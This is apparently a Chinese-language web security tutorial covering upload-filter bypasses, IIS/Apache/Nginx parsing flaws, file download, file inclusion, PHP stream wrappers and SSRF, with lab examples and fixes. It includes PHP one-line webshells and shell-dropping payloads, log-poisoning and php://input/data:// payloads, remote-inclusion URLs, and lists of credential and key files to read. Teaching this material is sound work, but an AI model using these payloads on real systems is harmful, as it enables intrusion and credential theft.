<h3 id="漏洞使用"><a href="#漏洞使用" class="headerlink" title="漏洞使用"></a>漏洞使用</h3><p><img src="/img/oldboy/image-20250304221428832.png" alt="image-20250304221428832"></p>
<p>1、客户端JavaScript前端检查绕过</p>
<p>​	一般通过查看源代码是否有相关检查</p>
<ol>
<li>可以通过bp抓包绕过</li>
<li>在前端页面禁用JS，直接上传webshell</li>
</ol>
<p>2、黑名单限制上传</p>
<p>​	通过限制相关的.php&#x2F;.jsp&#x2F;.asp等后缀</p>
<ol>
<li><p>使用未被限制的后缀绕过（如php3、php5需要配置相关配置文件）</p>
</li>
<li><p>使用.htaccess文件进行绕过(需要在http.conf文件中开启AllowOverried All )</p>
<p>如果是windows电脑使用php和windows环境叠加特性</p>
<p>​	双引号”   &#x3D;  点号.</p>
<p>​	大于符号&gt;  &#x3D;  问号?</p>
<p>​	小于符号&lt;  &#x3D;  星号*</p>
<p>上传后为空文件，需要将文件名改为4.&lt;或4.&lt;&lt;&lt;或4.&gt;&gt;&gt;或4.&gt;&gt;&lt;后再次上传，重写4.php文件内容</p>
</li>
<li><p>后缀大小写绕过</p>
</li>
<li><p>利用windows特性，增加空格( )和点(.)</p>
</li>
<li><p>利用windows特性，使用::$DATA文件流进行绕过</p>
</li>
</ol>
<blockquote>
<blockquote>
<p>.htaccess解释：</p>
<p>​	SetHandler application&#x2F;x-http-php的意思是设置当前目录所有文件都使用php解析，那么无论上传任何文件，只要符合php语言代码规范，就会被当做PHP执行。</p>
<p>通过这个机制可以先上传一个.htaccess文件，然后上传一个正常后缀的文件，相互搭配，实现php解析</p>
</blockquote>
</blockquote>
<p>3、白名单限制上传</p>
<ol>
<li>使用上传路径名%00截断(php版本要小于5.3.4，5.3.4及以上已经修复该问题；magic_quotes_gpc需要为OFF状态)</li>
<li>上传路径0x00绕过</li>
<li>绕过文件头检查，添加GIF图片的文件头GIF89a</li>
<li>copy 1.jpg &#x2F;b + shell.php &#x2F;a webshell.jpg合并绕过</li>
<li>绕过二次渲染，使用图片坚强马</li>
</ol>
<p>使用图片马需要搭配文件包含漏洞，才能使用</p>
<h2 id="中间件解析漏洞"><a href="#中间件解析漏洞" class="headerlink" title="中间件解析漏洞"></a>中间件解析漏洞</h2><h3 id="IIS解析漏洞"><a href="#IIS解析漏洞" class="headerlink" title="IIS解析漏洞"></a>IIS解析漏洞</h3><p><a href="./%E4%B8%AD%E9%97%B4%E4%BB%B6%E8%A7%A3%E6%9E%90%E6%BC%8F%E6%B4%9E.docx">.&#x2F;中间件解析漏洞.docx</a></p>
<h4 id="目录解析漏洞"><a href="#目录解析漏洞" class="headerlink" title="目录解析漏洞"></a>目录解析漏洞</h4><p>在 <strong>IIS5.x&#x2F;6.0</strong> 中，在网站下建立文件夹的名字为*.asp、*.asa、*.cer、*.cdx 的文件夹，那么其目录内的任何扩展名的文件都会被IIS当做asp文件来解释并执行。例如创建目录 test.asp，那么 &#x2F;test.asp&#x2F;1.jpg 将被当做asp文件来执行。假设黑客可以控制上传文件夹路径，就可以不管上传后你的图片改不改名都能拿shell了</p>
<h4 id="文件名解析漏洞"><a href="#文件名解析漏洞" class="headerlink" title="文件名解析漏洞"></a>文件名解析漏洞</h4><p>在 IIS5.x&#x2F;6.0 中， 分号后面的不被解析，也就是说 xie.asp;.jpg 会被服务器看成是xie.asp。还有IIS6.0默认的可执行文件除了asp还包含这两种 .asa  .cer 。而有些网站对用户上传的文件进行校验，只是校验其后缀名。所以我们只要上传 *.asp;.jpg、*.asa;.jpg、*.cer;.jpg 后缀的文件，就可以通过服务器校验，并且服务器会把它当成asp文件执行。</p>
<h4 id="畸形解析漏洞"><a href="#畸形解析漏洞" class="headerlink" title="畸形解析漏洞"></a>畸形解析漏洞</h4><p>在 IIS7.0中，在默认Fast-CGI开启状况下，我们往图片里面写入下面的代码</p>
<p>&lt;?php fputs(fopen(‘shell.php’,’w’),’&lt;?php @eval($_POST[x])?&gt;’)?&gt;</p>
<p>将文件保存成test.jpg格式，上传到服务器，假设上传路径为&#x2F;upload，上传成功后，直接访问&#x2F;upload&#x2F;test.jpg&#x2F;x.php，此时神奇的畸形解析开始发挥作用啦。test.jpg将会被服务器当成php文件执行，所以图片里面的代码就会被执行。我们会神奇的发现在 &#x2F;upload 目录下创建了一个一句话木马文件 shell.php 。</p>
<p>临时解决办法：设置 cgi.fix_pathinfo为0</p>
<h4 id="IIS7-5漏洞解析"><a href="#IIS7-5漏洞解析" class="headerlink" title="IIS7.5漏洞解析"></a>IIS7.5漏洞解析</h4><p>版本IIS7.5</p>
<p>漏洞产生原因： php.ini里默认cgi.fix_pathinfo&#x3D;1，对其进行访问的时候，在URL路径后添加.php后缀名会当做php文件进行解析</p>
<p>满足条件：</p>
<p>​	1、php.ini里默认cgi.fix_pathinfo&#x3D;1开启</p>
<p>​	2、设置FastCGI为关闭</p>
<p>漏洞利用方式：</p>
<p>​	将含有木马的正常文件后缀的文件进行上传，然后使用</p>
<p><a href="https://www.xp.cn/a.txt/.php">https://www.xp.cn/a.txt/.php</a></p>
<h3 id="Apache解析漏洞"><a href="#Apache解析漏洞" class="headerlink" title="Apache解析漏洞"></a>Apache解析漏洞</h3><p>漏洞原理</p>
<p>　　Apache 解析文件的规则是从右到左开始判断解析,如果后缀名为不可识别文件解析,就再往左判断。比如 test.php.owf.rar “.owf”和”.rar” 这两种后缀是apache不可识别解析,apache就会把oldboy.php.owf.rar解析成php。</p>
<p>漏洞形式</p>
<p><a href="http://www.xxxx.xxx.com/test.php.php123">www.xxxx.xxx.com/test.php.php123</a></p>
<p>其余配置问题导致漏洞</p>
<p>（1）如果在 Apache 的 conf 里有这样一行配置 AddHandler php5-script .php 这时只要文件名里包含.php 即使文件名是 test2.php.jpg 也会以 php 来执行。<br>（2）如果在 Apache 的 conf 里有这样一行配置 AddType application&#x2F;x-httpd-php .jpg 即使扩展名是 jpg，一样能以 php 方式执行。</p>
<p>修复方法：</p>
<p>​	1.apache配置文件，禁止.php.这样的文件执行，配置文件里面加入</p>
<p>​	&lt;Files ~ “.(php.|php3.)”&gt;</p>
<p>​    	Order Allow,Deny</p>
<p>​    	Deny from all</p>
<p>​	&lt;&#x2F;Files&gt;</p>
<p>​	2.用伪静态能解决这个问题，重写类似.php.*这类文件，打开apache的httpd.conf找到LoadModule rewrite_module modules&#x2F;mod_rewrite.so把#号去掉，重启apache,在网站根目录下建立.htaccess文件,代码如下:</p>
<p>​	<IfModule mod_rewrite.c></p>
<p>​	RewriteEngine On</p>
<p>​	RewriteRule .(php.|php3.) &#x2F;index.php</p>
<p>​	RewriteRule .(pHp.|pHp3.) &#x2F;index.php</p>
<p>​	RewriteRule .(phP.|phP3.) &#x2F;index.php</p>
<p>​	RewriteRule .(Php.|Php3.) &#x2F;index.php</p>
<p>​	RewriteRule .(PHp.|PHp3.) &#x2F;index.php</p>
<p>​	RewriteRule .(PhP.|PhP3.) &#x2F;index.php</p>
<p>​	RewriteRule .(pHP.|pHP3.) &#x2F;index.php</p>
<p>​	RewriteRule .(PHP.|PHP3.) &#x2F;index.php</p>
<p>​	&lt;&#x2F;IfModule&gt;</p>
<h3 id="Nginx解析漏洞"><a href="#Nginx解析漏洞" class="headerlink" title="Nginx解析漏洞"></a>Nginx解析漏洞</h3><p>漏洞原理</p>
<p>　　Nginx默认是以CGI的方式支持PHP解析的，普遍的做法是在Nginx配置文件中通过正则匹配设置SCRIPT_FILENAME。当访问<a href="http://www.xx.com/phpinfo.jpg/1.php%E8%BF%99%E4%B8%AAURL%E6%97%B6%EF%BC%8C$fastcgi_script_name%E4%BC%9A%E8%A2%AB%E8%AE%BE%E7%BD%AE%E4%B8%BA%E2%80%9Cphpinfo.jpg/1.php%E2%80%9D%EF%BC%8C%E7%84%B6%E5%90%8E%E6%9E%84%E9%80%A0%E6%88%90SCRIPT_FILENAME%E4%BC%A0%E9%80%92%E7%BB%99PHP">www.xx.com/phpinfo.jpg/1.php这个URL时，$fastcgi_script_name会被设置为“phpinfo.jpg/1.php”，然后构造成SCRIPT_FILENAME传递给PHP</a> CGI，但是PHP为什么会接受这样的参数，并将phpinfo.jpg作为PHP文件解析呢?这就要说到fix_pathinfo这个选项了。 如果开启了这个选项，那么就会触发在PHP中的如下逻辑：</p>
<p>PHP会认为SCRIPT_FILENAME是phpinfo.jpg，而1.php是PATH_INFO，所以就会将phpinfo.jpg作为PHP文件来解析了</p>
<p>漏洞形式</p>
<p><a href="http://www.xxxx.com/UploadFiles/image/1.jpg/1.php">www.xxxx.com/UploadFiles/image/1.jpg/1.php</a><br><a href="http://www.xxxx.com/UploadFiles/image/1.jpg/%00.php">www.xxxx.com/UploadFiles/image/1.jpg\%00.php</a><br><a href="http://www.xxxx.com/UploadFiles/image/1.jpg//%20/0.php">www.xxxx.com/UploadFiles/image/1.jpg/\%20\0.php</a></p>
<p>xxx.jpg%00.php (Nginx &lt;8.03 空字节代码执行漏洞)</p>
<p>另外一种手法：上传一个名字为test.jpg，以下内容的文件。</p>
<p>&lt;?PHP fputs(fopen(‘shell.php’,’w’),’&lt;?php eval($_POST[cmd])?&gt;‘);?&gt;</p>
<p>然后访问test.jpg&#x2F;.php,在这个目录下就会生成一句话木马shell.php。</p>
<p>修复方案</p>
<p>1.修改php.ini文件，将cgi.fix_pathinfo的值设置为0;<br>2.在Nginx配置文件中添加以下代码：</p>
<p>if ( $fastcgi_script_name ~ ..*&#x2F;.*php ) {</p>
<p>return 403;</p>
<p>}</p>
<p>这行代码的意思是当匹配到类似test.jpg&#x2F;a.php的URL时，将返回403错误代码。</p>
<h2 id="文件下载漏洞"><a href="#文件下载漏洞" class="headerlink" title="文件下载漏洞"></a>文件下载漏洞</h2><h3 id="漏洞介绍"><a href="#漏洞介绍" class="headerlink" title="漏洞介绍"></a>漏洞介绍</h3><p>一些网站由于业务需求，往往需要提供文件查看或文件下载功能，但若对用户查看或下载的文件不做限制，<br>则恶意用户就能够查看或下载任意敏感文件，这就是文件查看与下载漏洞。</p>
<h3 id="利用方式"><a href="#利用方式" class="headerlink" title="利用方式"></a>利用方式</h3><p>一般链接形式:<br>download.php?path&#x3D;<br>down.php?file&#x3D;<br>data.php?file&#x3D;<br>download.php?filename&#x3D;</p>
<p>或者包含参数:<br>&amp;Src&#x3D;<br>&amp;Inputfile&#x3D;<br>&amp;Filepath&#x3D;<br>&amp;Path&#x3D;<br>&amp;Data&#x3D;</p>
<p>靶场环境应用<br><a href="http://10.0.0.101:90/pikachu/vul/unsafedownload/down_nba.php">http://10.0.0.101:90/pikachu/vul/unsafedownload/down_nba.php</a><br>下载文件链接：<br><a href="http://10.0.0.101:90/pikachu/vul/unsafedownload/execdownload.php?filename=kb.png">http://10.0.0.101:90/pikachu/vul/unsafedownload/execdownload.php?filename=kb.png</a></p>
<p>当遇到一个任意文件下载时，我们的一般利用思路:</p>
<p>(1)下载常规的配置文件，例如: ssh,weblogic,ftp,mysql等相关配置</p>
<p>(2)下载各种.log文件，从中寻找一些后台地址，文件上传点之类的地方，如果运气好的话会获得一些前辈们的后门。</p>
<p>(3)下载web业务文件进行白盒审计，利用漏洞进一步攻入服务器。<br>   尝试读取&#x2F;root&#x2F;.bash_history看自己是否具有root权限。<br>   如果没有的话。我们只能按部就班的利用..&#x2F;来回跳转读取一些.ssh下的配置信息文件，读取mysql下的.bash_history文件。<br>   来查看是否记录了一些可以利用的相关信息。<br>   然后逐个下载我们需要审计的代码文件，但是下载的时候变得很繁琐，我们只能尝试去猜解目录，然后下载一些中间件的记录日志进行分析。</p>
<p>如果我们遇到的是java+oracle环境<br>可以先下载&#x2F;WEB-INF&#x2F;classes&#x2F;applicationContext.xml 文件，这里面记载的是web服务器的相应配置，然后下载&#x2F;WEB-INF&#x2F;classes&#x2F;xxx&#x2F;xxx&#x2F;ccc.class对文件进行反编译，然后搜索文件中的upload关键字看是否存在一些api接口，如果存在的话我们可以本地构造上传页面用api接口将我们的文件传输进服务器</p>
<p>如果具有root权限<br>在linux中有这样一个命令 locate 是用来查找文件或目录的，它不搜索具体目录，而是搜索一个数据库&#x2F;var&#x2F;lib&#x2F;mlocate&#x2F;mlocate.db。<br>这个数据库中含有本地所有文件信息。<br>Linux系统自动创建这个数据库，并且每天自动更新一次。<br>当我们不知道路径是什么的情况下，这个可以说是一个核武器了，我们利用任意文件下载漏洞mlocate.db文件下载下来，利用locate命令将数据输出成文件，这里面包含了全部的文件路径信息。</p>
<p>locate 读取方法: locate mlocate.db admin<br>&#x2F;&#x2F;可以将mlocate.db中包含admin文件名的内容全部输出来</p>
<p>（4）常见利用文件<br>&#x2F;root&#x2F;.ssh&#x2F;authorized_keys<br>&#x2F;root&#x2F;.ssh&#x2F;id_rsa<br>&#x2F;root&#x2F;.ssh&#x2F;id_ras.keystore<br>&#x2F;root&#x2F;.ssh&#x2F;known_hosts &#x2F;&#x2F;记录每个访问计算机用户的公钥<br>&#x2F;etc&#x2F;passwd<br>&#x2F;etc&#x2F;shadow<br>&#x2F;etc&#x2F;my.cnf &#x2F;&#x2F;mysql配置文件<br>&#x2F;etc&#x2F;httpd&#x2F;conf&#x2F;httpd.conf &#x2F;&#x2F;apache配置文件<br>&#x2F;root&#x2F;.bash_history &#x2F;&#x2F;用户历史命令记录文件<br>&#x2F;root&#x2F;.mysql_history &#x2F;&#x2F;mysql历史命令记录文件<br>&#x2F;proc&#x2F;mounts &#x2F;&#x2F;记录系统挂载设备<br>&#x2F;porc&#x2F;config.gz &#x2F;&#x2F;内核配置文件<br>&#x2F;var&#x2F;lib&#x2F;mlocate&#x2F;mlocate.db &#x2F;&#x2F;全文件路径<br>&#x2F;porc&#x2F;self&#x2F;cmdline &#x2F;&#x2F;当前进程的cmdline参数</p>
<h3 id="防御措施-1"><a href="#防御措施-1" class="headerlink" title="防御措施"></a>防御措施</h3><p>（1）过滤”.”，使用户在url中不能回溯上级目录</p>
<p>（2）正则严格判断用户输入参数的格式</p>
<p>（3）php.ini配置open_basedir限定文件访问范围</p>
<h1 id="文件包含漏洞"><a href="#文件包含漏洞" class="headerlink" title="文件包含漏洞"></a>文件包含漏洞</h1><h2 id="基础知识-1"><a href="#基础知识-1" class="headerlink" title="基础知识"></a>基础知识</h2><p>文件包含原理：</p>
<p>​	程序员在开发的时候，未对包含的文件进行严格过滤，攻击者可以构造图片木马文件当作php执行</p>
<p>漏洞产生原因：</p>
<p>​	在使用include()等函数时，未对包含的文件进行过滤。include()函数会将任意文件的类型，进行PHP代码解析</p>
<p>包含漏洞分类</p>
<ul>
<li>本地包含</li>
<li>远程包含<ul>
<li>远程包含需要开启allow_url_include&#x3D;on 、magic_quotes_gpc&#x3D;off</li>
</ul>
</li>
</ul>
<p>如何快速挖掘文件包含漏洞</p>
<p>​	直接查找源代码里的4个函数</p>
<p>​	include(),include_once(),require(),require_once()</p>
<p>这2个函数include(),include_once()不重复加载，require()和require_once()遇到错误退出</p>
<h2 id="本地包含漏洞LFI"><a href="#本地包含漏洞LFI" class="headerlink" title="本地包含漏洞LFI"></a>本地包含漏洞LFI</h2><h3 id="简介"><a href="#简介" class="headerlink" title="简介"></a>简介</h3><p>可以通过本地文件包含漏洞打开本地文件</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line"><span class="meta prompt_">	$</span><span class="language-bash">file=\<span class="variable">$_GET</span>[<span class="string">&#x27;filename&#x27;</span>];</span></span><br><span class="line"><span class="meta prompt_">	include($</span><span class="language-bash">file);</span></span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>



<p>利用此漏洞可以读取一些系统本地的敏感信息。</p>
<p>(1)使用绝对路径</p>
<p><a href="http://127.0.0.1/include.php?filename=C:%5Cwindows%5Csystem.ini">http://127.0.0.1/include.php?filename=C:\windows\system.ini</a></p>
<p>(2)使用相对路径进行读取</p>
<p>通过.&#x2F;表示当前位置路径，…&#x2F;表示上一级路径位置</p>
<p><a href="http://127.0.0.1/include.php?filename=../../phpinfo.jpg">http://127.0.0.1/include.php?filename=../../phpinfo.jpg</a></p>
<p>常用敏感信息路径：</p>
<p>windows：</p>
<p>C:\boot.ini &#x2F;&#x2F;查看系统版本<br>C:\windows\system32\inetsrv\MetaBase.xml &#x2F;&#x2F;IIS配置文件<br>C:\windows\repair\sam &#x2F;&#x2F;存储Windows系统初次安装的密码<br>C:\ProgramFiles\mysql\my.ini &#x2F;&#x2F;Mysql配置<br>C:\ProgramFiles\mysql\data\mysql\user.MYD &#x2F;&#x2F;MySQL root密码<br>C:\windows\php.ini &#x2F;&#x2F;php配置信息</p>
<p>Linux：</p>
<p>&#x2F;etc&#x2F;password &#x2F;&#x2F;账户信息<br>&#x2F;etc&#x2F;shadow &#x2F;&#x2F;账户密码信息<br>&#x2F;usr&#x2F;local&#x2F;app&#x2F;apache2&#x2F;conf&#x2F;httpd.conf &#x2F;&#x2F;Apache2默认配置文件<br>&#x2F;usr&#x2F;local&#x2F;app&#x2F;apache2&#x2F;conf&#x2F;extra&#x2F;httpd-vhost.conf &#x2F;&#x2F;虚拟网站配置<br>&#x2F;usr&#x2F;local&#x2F;app&#x2F;php5&#x2F;lib&#x2F;php.ini &#x2F;&#x2F;PHP相关配置<br>&#x2F;etc&#x2F;httpd&#x2F;conf&#x2F;httpd.conf &#x2F;&#x2F;Apache配置文件<br>&#x2F;etc&#x2F;my.conf &#x2F;&#x2F;mysql配置文件</p>
<h3 id="利用技巧"><a href="#利用技巧" class="headerlink" title="利用技巧"></a>利用技巧</h3><h4 id="配合文件进行上传"><a href="#配合文件进行上传" class="headerlink" title="配合文件进行上传"></a>配合文件进行上传</h4><p>无法找到文件上传漏洞上传webshell时，可以先通过上传一个图片格式的webshell到web服务器，在利用本地文件包含漏洞进行解析</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">	<span class="title function_ invoke__">fwrite</span>(<span class="title function_ invoke__">fopen</span>(<span class="string">&quot;shell.php&quot;</span>,<span class="string">&quot;w&quot;</span>),<span class="string">&#x27;&lt;?php eval($_POST[123]);?&gt;);</span></span><br><span class="line"><span class="string">?&gt;</span></span><br></pre></td></tr></table></figure>

<p>注：我们也可以直接在webshell.jpg中写一句话木马，然后再通过文件包含漏洞去连接webshell.jpg，但这种方法有时候webshell功能会出现异常。所以我们选择上面的方式，生成一个.php格式的一句话木马，再去连接。</p>
<h4 id="包含Apache日志文件"><a href="#包含Apache日志文件" class="headerlink" title="包含Apache日志文件"></a>包含Apache日志文件</h4><p>当Apache开启相关日志功能(\logs\access.log)后，通常可以访问URL携带一句话木马，从而写入日志文件中</p>
<p>利用条件：</p>
<p>​	对文件日志可读</p>
<p>​	知道日志文件存储目录</p>
<p>注意：一般情况下日志存储目录会被修改，需要读取服务器配置文件(httpd.conf,nginx.conf…..)或者根据phpinfo()带来的信息来得知</p>
<p>1、通常情况下，在地址栏构造  <a href="http://192.168.1.55:8080/dvwa/1.php">http://192.168.1.55:8080/dvwa/1.php</a> &lt;?php @eval($_POST[‘hack’]);?&gt;	发现日志记录中会将该URL进行编码，无法实现进行连接</p>
<p>2、需要通过burp抓包，重新构造请求行，进行发送</p>
<p>3、上传之后使用webshell管理工具进行连接。</p>
<h2 id="远程文件包含RFI"><a href="#远程文件包含RFI" class="headerlink" title="远程文件包含RFI"></a>远程文件包含RFI</h2><p>如果PHP的配置选项<code>allow_url_include</code>、<code>allow_url_fopen</code>状态为ON的话，则<strong>include&#x2F;require</strong>函数是可以加载远程文件的，这种漏洞被称为远程文件包含(RFI)</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line"><span class="meta prompt_">	$</span><span class="language-bash">path=<span class="variable">$_GET</span>[<span class="string">&#x27;path&#x27;</span>];</span></span><br><span class="line"><span class="meta prompt_">	include($</span><span class="language-bash">path . <span class="string">&#x27;/phpinfo.php&#x27;</span>);</span></span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>

<p>可以观察到该页面并没有对$path做任何过滤，因此存在文件包含漏洞。</p>
<p>我们在远端Web服务器&#x2F;site&#x2F;目录下创建一个test.php文件，内容为phpinfo()，利用漏洞去读取这个文件。</p>
<p>但是代码会给我们输入的路径后面加上’&#x2F;phpinfo.php’后缀，如果php版本小于5.3.4，我们可以尝试使用%00截断，这里php版本为7.3.4，不适用。</p>
<p>还有一种截断方法就是?号截断，在路径后面输入?号，服务器会认为?号后面的内容为GET方法传递的参数，成功读取test.php如下：<br><img src="/img/oldboy/2ca64d46dc74254f30699d6a5b43fd01.png" alt="在这里插入图片描述"></p>
<p>如果test.php是恶意的webshell文件，那么利用该漏洞就可以获取到服务器权限。</p>
<blockquote>
<p>可以通过在本地搭建图片马，然后操控靶机开启allow_url_include、allow_url_fopen参数，通过文件包含漏洞控制访问本机的图片马(例如：<a href="http://192.168.0.1/include.php?path=http://10.1.5.4/test.jpg">http://192.168.0.1/include.php?path=http://10.1.5.4/test.jpg</a>)</p>
<p>再通过蚁剑添加<a href="http://192.168.0.1/include.php?path=http://10.1.5.4/test.jpg%E4%BB%8E%E8%80%8C%E6%8E%A7%E5%88%B6%E9%9D%B6%E6%9C%BA">http://192.168.0.1/include.php?path=http://10.1.5.4/test.jpg从而控制靶机</a></p>
</blockquote>
<h2 id="PHP伪协议"><a href="#PHP伪协议" class="headerlink" title="PHP伪协议"></a>PHP伪协议</h2><p><img src="/img/oldboy/image-20250306163301204.png" alt="image-20250306163301204"></p>
<p><img src="https://i-blog.csdnimg.cn/blog_migrate/cdf1dfdb5bf058cc3c07823f2c9a0cc8.png" alt="在这里插入图片描述"></p>
<h3 id="file-协议"><a href="#file-协议" class="headerlink" title="file:&#x2F;&#x2F;协议"></a>file:&#x2F;&#x2F;协议</h3><p><strong>file:&#x2F;&#x2F;</strong> 用于访问本地文件系统，在CTF中通常用来读取本地文件的且不受allow_url_fopen与allow_url_include的影响</p>
<p><img src="https://i-blog.csdnimg.cn/blog_migrate/9804c2536776aebd3e8f87d6e6ba3170.png" alt="在这里插入图片描述"></p>
<h3 id="php-协议"><a href="#php-协议" class="headerlink" title="php:&#x2F;&#x2F;协议"></a>php:&#x2F;&#x2F;协议</h3><p>php:&#x2F;&#x2F; 访问各个输入&#x2F;输出流（I&#x2F;O streams），在CTF中经常使用的是<code>php://filter</code>和<code>php://input</code><br><strong>php:&#x2F;&#x2F;filter用于读取源码</strong>。<br><strong>php:&#x2F;&#x2F;input用于执行php代码</strong>。</p>
<p><strong>php:&#x2F;&#x2F;filter</strong> 读取源代码并进行base64编码输出，不然会直接当做php代码执行就看不到源代码内容了。</p>
<p><strong>利用条件:</strong>	</p>
<ul>
<li>allow_url_fopen ：off&#x2F;on</li>
<li>allow_url_include：off&#x2F;on</li>
</ul>
<p>有特殊字符一定要转化为base64，例如：<a href="http://192.168.1.55:8080/dvwa/vulnerabilities/fi/?page=php://filter/read=convert.base64-encode/resource=x.php">http://192.168.1.55:8080/dvwa/vulnerabilities/fi/?page=php://filter/read=convert.base64-encode/resource=x.php</a></p>
<p>再进行base64解码，获取到2.php的完整源码信息</p>
<p><strong>php:&#x2F;&#x2F;input</strong> 可以访问请求的原始数据的只读流, 将post请求中的数据作为PHP代码执行。当传入的参数作为文件名打开时，可以将参数设为php:&#x2F;&#x2F;input,同时post想设置的文件内容，php执行时会将post内容当作文件内容。从而导致任意代码执行。</p>
<p><strong>利用条件:</strong></p>
<ul>
<li>allow_url_fopen ：off&#x2F;on</li>
<li>allow_url_include：on</li>
</ul>
<p>利用该方法，我们可以直接写入php文件，输入<code>file=php://input</code>，然后使用burp抓包，写入php代码：</p>
<p><img src="https://i-blog.csdnimg.cn/blog_migrate/77e3a356bb8653fe01cb7f79f577c36a.png" alt="在这里插入图片描述"></p>
<p>发送报文，可以看到本地生成了一句话木马：</p>
<p><img src="https://i-blog.csdnimg.cn/blog_migrate/0fccd0cb7c16e9308cd76529b316a3b2.png" alt="在这里插入图片描述"></p>
<h3 id="ZIP-协议"><a href="#ZIP-协议" class="headerlink" title="ZIP:&#x2F;&#x2F;协议"></a>ZIP:&#x2F;&#x2F;协议</h3><p>zip:&#x2F;&#x2F; 可以访问压缩包里面的文件。当它与包含函数结合时，zip:&#x2F;&#x2F;流会被当作php文件执行。从而实现任意代码执行。</p>
<p>​	zip:&#x2F;&#x2F;中只能传入绝对路径。<br>​	要用#分割压缩包和压缩包里的内容，并且#要用url编码成%23(即下述POC中#要用%23替换）<br>​	只需要是zip的压缩包即可，后缀名可以任意更改。<br>​	相同的类型还有zlib:&#x2F;&#x2F;和bzip2:&#x2F;&#x2F;</p>
<p><strong>利用条件:</strong></p>
<ul>
<li>allow_url_fopen ：off&#x2F;on</li>
<li>allow_url_include：off&#x2F;on</li>
</ul>
<p>POC为：</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">zip://[压缩包绝对路径]#[压缩包内文件]?file=zip://D:\1.zip\%23phpinfo.txt</span><br><span class="line"></span><br></pre></td></tr></table></figure>



<p><img src="https://i-blog.csdnimg.cn/blog_migrate/012f3ceb1aa9bc1dc885d1ddf13d3212.png" alt="在这里插入图片描述"></p>
<h3 id="data-协议"><a href="#data-协议" class="headerlink" title="data:&#x2F;&#x2F;协议"></a>data:&#x2F;&#x2F;协议</h3><p>data:&#x2F;&#x2F; 同样类似与php:&#x2F;&#x2F;input，可以让用户来控制输入流，当它与包含函数结合时，用户输入的data:&#x2F;&#x2F;流会被当作php文件执行。从而导致任意代码执行。</p>
<p>利用data:&#x2F;&#x2F; 伪协议可以直接达到执行php代码的效果，例如执行phpinfo()函数：<br>利用条件:</p>
<p>allow_url_fopen ：on<br>allow_url_include：on</p>
<p>POC为:</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">data://text/plain,&lt;?php phpinfo();?&gt;</span><br><span class="line">//如果此处对特殊字符进行了过滤，我们还可以通过base64编码后再输入：</span><br><span class="line">data://text/plain;base64,PD9waHAgcGhwaW5mbygpPz4=</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p><img src="https://i-blog.csdnimg.cn/blog_migrate/f40ca9293fc6372eb5961de2438b36e8.png" alt="在这里插入图片描述"></p>
<h2 id="文件包含漏洞防护"><a href="#文件包含漏洞防护" class="headerlink" title="文件包含漏洞防护"></a>文件包含漏洞防护</h2><p>1、使用str_replace等方法过滤掉危险字符</p>
<p>2、配置open_basedir，防止目录遍历（open_basedir 将php所能打开的文件限制在指定的目录树中）</p>
<p>3、php版本升级，防止%00截断</p>
<p>4、对上传的文件进行重命名，防止被读取</p>
<p>5、对于动态包含的文件可以设置一个白名单，不读取非白名单的文件。</p>
<p>6、做好管理员权限划分，做好文件的权限管理，allow_url_include和allow_url_fopen最小权限化</p>
<h1 id="SSRF跨站伪造请求"><a href="#SSRF跨站伪造请求" class="headerlink" title="SSRF跨站伪造请求"></a>SSRF跨站伪造请求</h1><h2 id="基础知识-2"><a href="#基础知识-2" class="headerlink" title="基础知识"></a>基础知识</h2><h3 id="SSRF原理"><a href="#SSRF原理" class="headerlink" title="SSRF原理"></a>SSRF原理</h3><p>SSRF服务器端跨站伪造请求，是一种攻击者构造由服务器端请求发起的一个安全漏洞。</p>
<p>一般情况下，SSRF攻击的目标是从外网无法访问的内部系统。（正是因为它是由服务端发起的，所以它能够请求到与它相连而与外网隔离的内部系统）</p>
<p>攻击原理</p>
<p>攻击者控制内网的一台服务器进而攻击再同一内网的其他服务器</p>
<h3 id="SSRF产生原因"><a href="#SSRF产生原因" class="headerlink" title="SSRF产生原因"></a>SSRF产生原因</h3><p>服务器端的验证并没有对其请求获取图片的参数(image&#x3D;)做出严格的过滤以及限制，导致内网服务器可以获取内网其他服务器的数据。</p>
<p>SSRF漏洞就是通过篡改获取资源的请求发送给服务器，但是服务器并没有检测这个请求是否合法的，然后服务器以他的身份来访问其他服务器的资源。</p>
<h2 id="漏洞挖掘-1"><a href="#漏洞挖掘-1" class="headerlink" title="漏洞挖掘"></a>漏洞挖掘</h2><p>1、分享：通过URL地址分享网页内容	</p>
<p>​	例如：<a href="http://test.com/share.do?link=http://www.baidu.com">http://test.com/share.do?link=http://www.baidu.com</a></p>
<p>2、转码服务：通过URL地址把原地址的网页内容调优使其适合手机屏幕浏览:由于手机屏幕大小的关系，直接浏览网页内容的时候会造成许多不便，因此有些公司提供了转码功能，把网页内容通过相关手段转为适合手机屏幕浏览的样式。</p>
<p>3、在线翻译：通过URL地址翻译对应文本的内容。提供此功能的国内公司有百度、有道等。</p>
<p>4、图片、文章收藏功能:此处的图片、文章收藏中的文章收藏就类似于分享功能中获取URL地址中title以及文本的内容作为显示，目的还是为了更好的用户体验，而图片收藏就类似于功能四、图片加载。</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">http://title.xxx.com/title?title=http://title.xxx.com/as52ps63de</span><br></pre></td></tr></table></figure>



<p>5、未公开的api实现以及其他调用URL的功能:此处类似的功能有360提供的网站评分，以及有些网站通过api获取远程地址xml文件来加载内容。</p>
<p>6、图片加载与下载；通过url地址加载与下载图片</p>
<p>通过URL关键字中寻找</p>
<blockquote>
<p>share<br>wap<br>url<br>link<br>src<br>source<br>target<br>u<br>display<br>sourceURl<br>imageURL<br>domain</p>
</blockquote>
<h2 id="漏洞函数"><a href="#漏洞函数" class="headerlink" title="漏洞函数"></a>漏洞函数</h2><p>产生SSRF的函数主要是：</p>
<ol>
<li>file_get_contents()</li>
<li>sockopen()</li>
<li>curl_exec()</li>
</ol>
<h3 id="file-get-contents"><a href="#file-get-contents" class="headerlink" title="file_get_contents()"></a>file_get_contents()</h3><p>下面的代码使用file_get_contents函数从用户指定的url获取图片。然后把它用一个随即文件名保存在硬盘上，并展示给用户。</p>
